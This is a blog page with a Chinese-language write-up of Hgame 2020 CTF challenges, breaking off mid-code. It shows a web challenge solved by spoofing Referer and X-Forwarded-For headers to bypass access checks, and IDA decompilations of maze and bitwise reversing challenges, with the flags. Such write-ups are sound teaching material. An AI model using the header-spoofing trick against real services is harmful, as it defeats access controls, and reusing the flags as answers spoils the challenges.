<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="记录一下Hgame的部分题解和一些解题时的思路">
<meta property="og:type" content="article">
<meta property="og:title" content="hgame_wp">
<meta property="og:url" content="http://blog.rycbar.club/2020/01/25/hgame-wp/index.html">
<meta property="og:site_name" content="rr&#39;s blog">
<meta property="og:description" content="记录一下Hgame的部分题解和一些解题时的思路">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://s2.ax1x.com/2020/02/13/1qp5rT.png">
<meta property="og:image" content="https://s2.ax1x.com/2020/02/13/1qpqi9.png">
<meta property="article:published_time" content="2020-01-25T12:28:09.000Z">
<meta property="article:modified_time" content="2020-03-16T08:04:39.591Z">
<meta property="article:author" content="Aorui Zhang">
<meta property="article:tag" content="writeup">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="re">
<meta property="article:tag" content="hgame">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.ax1x.com/2020/02/13/1qp5rT.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>hgame_wp</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="rr&#39;s blog" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/atom.xml">RSS</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2020/02/19/%E8%8A%B1%E6%8C%87%E4%BB%A4/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2020/01/11/BUUCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.rycbar.club/2020/01/25/hgame-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.rycbar.club/2020/01/25/hgame-wp/&text=hgame_wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.rycbar.club/2020/01/25/hgame-wp/&title=hgame_wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.rycbar.club/2020/01/25/hgame-wp/&is_video=false&description=hgame_wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=hgame_wp&body=Check out this article: http://blog.rycbar.club/2020/01/25/hgame-wp/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.rycbar.club/2020/01/25/hgame-wp/&title=hgame_wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.rycbar.club/2020/01/25/hgame-wp/&title=hgame_wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.rycbar.club/2020/01/25/hgame-wp/&title=hgame_wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.rycbar.club/2020/01/25/hgame-wp/&title=hgame_wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.rycbar.club/2020/01/25/hgame-wp/&name=hgame_wp&description=&lt;p&gt;记录一下Hgame的部分题解和一些解题时的思路&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.rycbar.club/2020/01/25/hgame-wp/&t=hgame_wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Week1"><span class="toc-number">1.</span> <span class="toc-text">Week1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A5-%E5%A4%B4-%E9%9C%B8-%E7%8E%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">接 头 霸 王</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RE"><span class="toc-number">1.2.</span> <span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#maze"><span class="toc-number">1.2.1.</span> <span class="toc-text">maze</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bitwise-operation2"><span class="toc-number">1.2.2.</span> <span class="toc-text">bitwise_operation2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#advance"><span class="toc-number">1.2.3.</span> <span class="toc-text">advance</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cpp"><span class="toc-number">1.2.4.</span> <span class="toc-text">cpp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PWN"><span class="toc-number">1.3.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Hard-AAAAA"><span class="toc-number">1.3.1.</span> <span class="toc-text">Hard_AAAAA</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto"><span class="toc-number">1.4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#InfantRSA"><span class="toc-number">1.4.1.</span> <span class="toc-text">InfantRSA</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc"><span class="toc-number">1.5.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AC%A2%E8%BF%8E%E5%8F%82%E5%8A%A0HGame%EF%BC%81"><span class="toc-number">1.5.1.</span> <span class="toc-text">欢迎参加HGame！</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A3%81%E7%BA%B8"><span class="toc-number">1.5.2.</span> <span class="toc-text">壁纸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98ProPlus"><span class="toc-number">1.5.3.</span> <span class="toc-text">签到题ProPlus</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2"><span class="toc-number">2.</span> <span class="toc-text">Week2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RE-1"><span class="toc-number">2.1.</span> <span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#unpack"><span class="toc-number">2.1.1.</span> <span class="toc-text">unpack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Classic-CrackMe"><span class="toc-number">2.1.2.</span> <span class="toc-text">Classic_CrackMe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#babyPy"><span class="toc-number">2.1.3.</span> <span class="toc-text">babyPy</span></a></li></ol></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        hgame_wp
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Aorui Zhang</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-01-25T12:28:09.000Z" itemprop="datePublished">2020-01-25</time>
        
        (Updated: <time datetime="2020-03-16T08:04:39.591Z" itemprop="dateModified">2020-03-16</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/ctf/">ctf</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/ctf/" rel="tag">ctf</a>, <a class="tag-link-link" href="/tags/hgame/" rel="tag">hgame</a>, <a class="tag-link-link" href="/tags/re/" rel="tag">re</a>, <a class="tag-link-link" href="/tags/writeup/" rel="tag">writeup</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>记录一下Hgame的部分题解和一些解题时的思路</p>
<span id="more"></span>

<h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h4><p>打开题目，发现提示需要从vidar.club过来，所以burp抓包到repeater，添加响应头：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:https://vidar.club</span><br></pre></td></tr></table></figure>

<p>然后提示需要从本地访问，添加响应头：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br></pre></td></tr></table></figure>

<p>接着提示flag会在2077年更新，所以添加响应头：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If-Unmodified-Since:Fri, 01 Jan 2077 00:00:00 GMT</span><br></pre></td></tr></table></figure>

<p>再发送请求得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;W0w!Your_heads_@re_s0_many!&#125;</span><br></pre></td></tr></table></figure>



<h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h4><p>一看题目又是一道迷宫题，拖进IDA反编译</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">v5 = (<span class="keyword">char</span> *)&amp;unk_6020C4;</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v4 &lt; <span class="built_in">SHIDWORD</span>(v4) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = s[(<span class="keyword">signed</span> <span class="keyword">int</span>)v4];</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 &gt; <span class="number">100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">115</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 += <span class="number">64</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 != <span class="number">119</span> )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Illegal input!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v5 -= <span class="number">64</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">97</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      v5 -= <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt; (<span class="keyword">char</span> *)&amp;unk_602080 || v5 &gt; (<span class="keyword">char</span> *)&amp;unk_60247C || *(_DWORD *)v5 &amp; <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="built_in">LODWORD</span>(v4) = v4 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == (<span class="keyword">char</span> *)&amp;unk_60243C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(&amp;v7, <span class="string">&quot;hgame&#123;%s&#125;&quot;</span>, s, v4);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You win!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Flag is: &quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;v7);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_22:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You died&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>贴出来的是反编译出来的主要部分，从这里可以确定v5的起始位置是unk_6020C4，上下左右分别是’w’,’s’,’a’,’d’，左右移动变化4字节，将所有的数据转化为DWORD类型，上下移动变化64字节，所以每行16个元素，范围是unk_602080到unk_60247C，正好是256个DWORD类型，组成16*16的方阵，其中所有和1按位与运算结果为0的是可以走的路线，即所有末尾为0的值是可以走的位置，最终的目标是走到unk_60243C这个点</p>
<p><img src="https://s2.ax1x.com/2020/02/13/1qp5rT.png" alt="maze"></p>
<p>即从（2，2）位置走到（15，16）位置</p>
<p>所以最后的flag为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;ssssddddddsssssddwwdddssssdssdd&#125;</span><br></pre></td></tr></table></figure>

<h4 id="bitwise-operation2"><a href="#bitwise-operation2" class="headerlink" title="bitwise_operation2"></a>bitwise_operation2</h4><p>这题是让人头疼的位运算符，要把运算总共分为三个部分，要把整个过程都弄清楚，然后一部分一部分的逆向出来，任何一部分错了都会导致最终flag出错，还是挺考验细心和耐心的。</p>
<p>首先发现是linux可执行文件，拖进IDA反编译，并且对每一部分的作用进行一个分析</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//只贴出了有用的部分并且稍做了排版</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+11h] [rbp-5Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+12h] [rbp-5Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+13h] [rbp-5Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+14h] [rbp-5Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [rsp+15h] [rbp-5Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+16h] [rbp-5Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [rsp+17h] [rbp-59h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+28h] [rbp-48h]</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+30h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+38h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+40h] [rbp-30h]		//地址是连续的，flag中间的具体内容是v24和v25起始的两个16</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [rsp+41h] [rbp-2Fh]		//字节</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [rsp+42h] [rbp-2Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [rsp+43h] [rbp-2Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [rsp+44h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [rsp+45h] [rbp-2Bh]</span></span><br><span class="line">  __int16 v24; <span class="comment">// [rsp+46h] [rbp-2Ah]</span></span><br><span class="line">  __int16 v25; <span class="comment">// [rsp+56h] [rbp-1Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v26; <span class="comment">// [rsp+66h] [rbp-Ah]</span></span><br><span class="line">  <span class="built_in">sub_4007E6</span>();<span class="comment">//只负责输出，没什么功能</span></span><br><span class="line">  v6 = <span class="number">76</span>;v7 = <span class="number">60</span>;v8 = <span class="number">214</span>;v9 = <span class="number">54</span>;v10 = <span class="number">80</span>;v11 = <span class="number">136</span>;v12 = <span class="number">32</span>;v13 = <span class="number">204</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%39s&quot;</span>, &amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s) == <span class="number">39</span> &amp;&amp; s == <span class="string">&#x27;h&#x27;</span> &amp;&amp; v19 == <span class="string">&#x27;g&#x27;</span> &amp;&amp; v20 == <span class="string">&#x27;a&#x27;</span> &amp;&amp; v21 == <span class="string">&#x27;m&#x27;</span> &amp;&amp; v22 == <span class="string">&#x27;e&#x27;</span> &amp;&amp; v23 == <span class="string">&#x27;&#123;&#x27;</span> &amp;&amp; v26 == <span class="string">&#x27;&#125;&#x27;</span> )<span class="comment">// 共39位，hgame&#123;***&#125;格式</span></span><br><span class="line">  &#123;</span><br><span class="line">    v14 = <span class="number">0LL</span>;</span><br><span class="line">    v15 = <span class="number">0</span>;</span><br><span class="line">    v16 = <span class="number">0LL</span>;</span><br><span class="line">    v17 = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//这两条命令进行第一部分运算</span></span><br><span class="line">    <span class="built_in">sub_400616</span>((__int64)&amp;v14, (__int64)&amp;v24);   <span class="comment">// 传入地址，对flag中的部分进行操作</span></span><br><span class="line">    <span class="built_in">sub_400616</span>((__int64)&amp;v16, (__int64)&amp;v25);</span><br><span class="line">     </span><br><span class="line">    <span class="comment">//这里开始进行第二部分运算</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)&amp;v14 + i) = ((*((_BYTE *)&amp;v14 + i) &amp; <span class="number">0xE0</span>) &gt;&gt; <span class="number">5</span>) | <span class="number">8</span> * *((_BYTE *)&amp;v14 + i);<span class="comment">// &amp;v14 + i前三位与后五位交换位置</span></span><br><span class="line">      *((_BYTE *)&amp;v14 + i) = *((_BYTE *)&amp;v14 + i) &amp; <span class="number">0x55</span> ^ ((*((_BYTE *)&amp;v16 + <span class="number">7</span> - i) &amp; <span class="number">0xAA</span>) &gt;&gt; <span class="number">1</span>) | *((_BYTE *)&amp;v14 + i) &amp; <span class="number">0xAA</span>;<span class="comment">// &amp;v14+i的奇数位不变，偶数位和&amp;v16+7-i的奇数位异或</span></span><br><span class="line">      *((_BYTE *)&amp;v16 + <span class="number">7</span> - i) = <span class="number">2</span> * (*((_BYTE *)&amp;v14 + i) &amp; <span class="number">0x55</span>) ^ *((_BYTE *)&amp;v16 + <span class="number">7</span> - i) &amp; <span class="number">0xAA</span> | *((_BYTE *)&amp;v16 + <span class="number">7</span> - i) &amp; <span class="number">0x55</span>;<span class="comment">// &amp;v16+7-i的偶数位不变，奇数位和&amp;v14+i的偶数位异或</span></span><br><span class="line">      *((_BYTE *)&amp;v14 + i) = *((_BYTE *)&amp;v14 + i) &amp; <span class="number">0x55</span> ^ ((*((_BYTE *)&amp;v16 + <span class="number">7</span> - i) &amp; <span class="number">0xAA</span>) &gt;&gt; <span class="number">1</span>) | *((_BYTE *)&amp;v14 + i) &amp; <span class="number">0xAA</span>;<span class="comment">// &amp;v14+i奇数位不变，偶数位和&amp;v16+7-i的奇数位异或</span></span><br><span class="line">    &#125;                                           </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//这里进行第三部分运算</span></span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)&amp;v14 + j) ^= *(&amp;v6 + j);       <span class="comment">// v6 = 76;</span></span><br><span class="line">                                                <span class="comment">//   v7 = 60;</span></span><br><span class="line">                                                <span class="comment">//   v8 = 214;</span></span><br><span class="line">                                                <span class="comment">//   v9 = 54;</span></span><br><span class="line">                                                <span class="comment">//   v10 = 80;</span></span><br><span class="line">                                                <span class="comment">//   v11 = 136;</span></span><br><span class="line">                                                <span class="comment">//   v12 = 32;</span></span><br><span class="line">                                                <span class="comment">//   v13 = 204;</span></span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)&amp;v14 + j) != byte_602050[j] )<span class="comment">// e4sy_Re_</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sry, wrong flag&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">7</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)&amp;v16 + k) ^= *((_BYTE *)&amp;v14 + k) ^ *(&amp;v6 + k);	<span class="comment">// v6 = 76;</span></span><br><span class="line">                            	<span class="comment">//这里异或之后又变成了V14最初始的值   	  //   v7 = 60;</span></span><br><span class="line">                                                					<span class="comment">//   v8 = 214;</span></span><br><span class="line">                                                					<span class="comment">//   v9 = 54;</span></span><br><span class="line">                                                					<span class="comment">//   v10 = 80;</span></span><br><span class="line">                                                					<span class="comment">//   v11 = 136;</span></span><br><span class="line">                                                					<span class="comment">//   v12 = 32;</span></span><br><span class="line">                                                					<span class="comment">//   v13 = 204;</span></span><br><span class="line">      <span class="keyword">if</span> ( *((_BYTE *)&amp;v16 + k) != byte_602060[k] )<span class="comment">// Easylif3</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Just one last step&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congratulations! You are already familiar with bitwise operation.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Flag is your input.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Illegal input!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//sub_400616() 第一部分运算所用到的函数</span></span><br><span class="line"><span class="function">_BYTE *__fastcall <span class="title">sub_400616</span><span class="params">(__int64 a1, __int64 